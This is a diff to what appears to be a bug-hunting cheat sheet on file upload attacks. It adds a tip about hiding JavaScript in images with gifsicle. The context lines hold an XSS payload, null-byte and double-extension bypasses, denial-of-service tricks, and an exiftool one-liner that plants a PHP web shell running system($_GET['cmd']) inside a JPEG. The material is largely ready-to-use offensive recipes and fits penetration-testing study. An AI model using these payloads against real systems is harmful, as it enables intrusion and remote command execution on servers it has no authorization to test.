@@ -1269,6 +1269,7 @@ File Upload
 1- If pdf accepted then upload xss.pdf  => https://github.com/teamhackeregypt/mythology/blob/main/xss.pdf
 2- if accepts pdf only then => hossam.html%00.pdf  ==> change Content-type: text/html
 3- if accepts html then make file.html with <img src=x onerror=alert(1)>
+
 4- check for file upload size which can lead to DOS attack 
 5- put very long name for filename to see if you can perform DOS
 6- bypassing restrictions => 
@@ -1332,7 +1333,7 @@ https://hackerone.com/reports/390#:~:text=By%20loading%20the%20'whole%20image,Ph
 /?file=xx.php    <- Blocked
 /?file===xx.php  <- Bypassed
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg 
-
+· Upload a javascript using Image file — Use gifsicle tool.
 31- 1- found a subdomain and create acc&login 
 	2- profile image extention's limited to jpg,png,jpeg
 	3- in upload image Request i changed file type test.jpg to test.php&test.php%00.jpg,... not bypassed
